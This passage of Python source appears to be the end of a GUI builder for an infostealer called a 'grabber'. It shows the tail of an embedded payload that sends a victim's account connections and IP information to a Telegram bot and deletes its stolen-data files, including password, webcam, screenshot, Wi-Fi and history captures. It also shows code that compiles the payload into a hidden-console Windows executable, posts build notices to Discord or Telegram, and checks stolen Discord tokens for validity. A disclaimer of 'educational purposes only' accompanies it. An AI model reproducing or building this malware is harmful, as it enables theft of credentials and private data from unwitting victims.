                            f"🔗 *Connections*: {{self.truncate('\\n'.join([f'{{c['type']}}: {{c['name']}}' for c in connections]) if connections else 'None')}}\\n"
                            f"🌐 *IP Info*: {{ip_info_str}}"
                        )
                        send_telegram_message(message_content)
                    final_to_return.append(f"Successfully sent data for {{username}}")
                except Exception as e:
                    final_to_return.append(f"Failed to send data for {{username}}")
            return final_to_return

    if __name__ == "__main__":
        try:
            result = GrabDiscord.initialize(raw_data=False)
        except Exception:
            pass
finally:
    for file in [LOCK_FILE, TEMP_DB, TEMP_HISTORY_DB, PASSWORD_FILE, SCREENSHOT_ZIP, WEBCAM_PATH, SCREEN_PATH, GAME_INFO_PATH, WIFI_INFO_PATH, SEARCH_HISTORY_PATH, SYSTEM_INFO_FILE]:
        if os.path.exists(file):
            try:
                os.remove(file)
            except Exception:
                pass
    sys.exit(0)
'''
        downloads_path = os.path.join(os.environ["USERPROFILE"], "Downloads")
        temp_py_file = os.path.join(downloads_path, f"{filename}_temp.py")
        output_exe_file = os.path.join(downloads_path, f"{filename}.exe")
        script_dir = os.path.dirname(os.path.abspath(__file__))
        icon_path = os.path.join(script_dir, "icon.ico")
        try:
            with open(temp_py_file, "w", encoding="utf-8") as f:
                f.write(grabber_code)
            self.status_label.configure(text=f"Created temporary file: {filename}_temp.py")
            if not os.path.exists(icon_path):
                messagebox.showwarning("Warning", "icon.ico not found. Building without custom icon.")
                self.status_label.configure(text="Warning: Building without icon")
            pyinstaller_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                temp_py_file,
                f"--distpath={downloads_path}",
                f"--name={filename}"
            ]
            if os.path.exists(icon_path):
                pyinstaller_cmd.append(f"--icon={icon_path}")
            process = subprocess.run(pyinstaller_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if process.returncode == 0:
                messagebox.showinfo("Success", f"Grabber built successfully!\nSaved to: {output_exe_file}")
                self.status_label.configure(text="Build completed successfully!")
                if method == "Discord":
                    webhook_data = {
                        "username": "Sholmx <3",
                        "avatar_url": "https://th.bing.com/th/id/OIP.FecqYGeMV_hNSbDNPS_GRgHaHC?rs=1&pid=ImgDetMain",
                        "content": ping_content,
                        "embeds": [
                            {
                                "title": "Works!!!",
                                "description": f"A new grabber has been built.\n\n**File Name:** {filename}\n**Build Date:** {datetime.now().strftime('%Y-%m-%d')}",
                                "color": 0x00FF00,
                                "thumbnail": {"url": "https://th.bing.com/th/id/OIP.FecqYGeMV_hNSbDNPS_GRgHaHC?rs=1&pid=ImgDetMain"},
                                "footer": {"text": "github.com/sholmx"},
                                "timestamp": datetime.now(timezone.utc).isoformat()
                            },
                            {
                                "title": "Thank you!",
                                "description": "Thank you for using my grabber! Remember to use it for educational purposes only! If you would like to support my work, please give me a star on GitHub!\n[GitHub Link](https://github.com/sholmx/Sholmx-Grabber/blob/main/README.md)",
                                "color": 0x00FF00,
                                "thumbnail": {"url": "https://cdn.discordapp.com/emojis/769685606789474560.png"},
                                "footer": {"text": "github.com/sholmx"},
                                "timestamp": datetime.now(timezone.utc).isoformat()
                            }
                        ]
                    }
                    try:
                        requests.post(webhook_url, json=webhook_data)
                    except Exception as e:
                        self.status_label.configure(text=f"Build completed, but Discord webhook failed: {str(e)}")
                elif method == "Telegram":
                    telegram_message = (
                        f"*EXE Successfully Created!*\n"
                        f"A new grabber has been built.\n\n"
                        f"**File Name:** {filename}\n"
                        f"**Build Date:** {datetime.now().strftime('%Y-%m-%d')}\n\n"
                        f"*Thank you!*\n"
                        f"Thank you for using my grabber! Remember to use it for educational purposes only! "
                        f"If you would like to support my work, please give me a star on GitHub!\n"
                        f"[GitHub Link](https://github.com/sholmx/Sholmx-Grabber/blob/main/README.md)"
                    )
                    try:
                        response = requests.post(
                            f"https://api.telegram.org/bot{telegram_token}/sendMessage",
                            data={"chat_id": telegram_chat_id, "text": telegram_message, "parse_mode": "Markdown"}
                        )
                        if response.status_code != 200:
                            raise Exception(f"Telegram API error: {response.text}")
                    except Exception as e:
                        self.status_label.configure(text=f"Build completed, but Telegram notification failed: {str(e)}")
            else:
                messagebox.showerror("Error", "Failed to build .exe. Check console for details.")
                self.status_label.configure(text="Build failed!")
            for path in [temp_py_file, os.path.join(downloads_path, "build"), os.path.join(downloads_path, f"{filename}.spec")]:
                if os.path.exists(path):
                    if os.path.isdir(path):
                        shutil.rmtree(path)
                    else:
                        os.remove(path)
        except Exception as e:
            messagebox.showerror("Error", f"Build failed: {str(e)}")
            self.status_label.configure(text=f"Build error: {str(e)}")

    def test_token(self):
        token = self.token_entry.get().strip()
        if not token:
            self.result_label.configure(text="Please enter a token to test!", text_color="#ff5555")
            self.status_label.configure(text="Token test failed: No input")
            return
        self.status_label.configure(text="Testing token...")
        try:
            response = requests.get("https://discord.com/api/v9/users/@me", headers={'Authorization': token})
            if response.status_code == 200:
                user = response.json()
                self.result_label.configure(
                    text=f"Valid token!\nUsername: {user['username']}#{user['discriminator']}\nID: {user['id']}",
                    text_color="#55ff55"
                )
                self.status_label.configure(text="Token test successful!")
            else:
                self.result_label.configure(text="Invalid token!", text_color="#ff5555")
                self.status_label.configure(text="Token test failed: Invalid token")
        except Exception as e:
            self.result_label.configure(text=f"Error testing token: {str(e)}", text_color="#ff5555")
            self.status_label.configure(text="Token test error")

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    app = grabber222()
    app.mainloop()
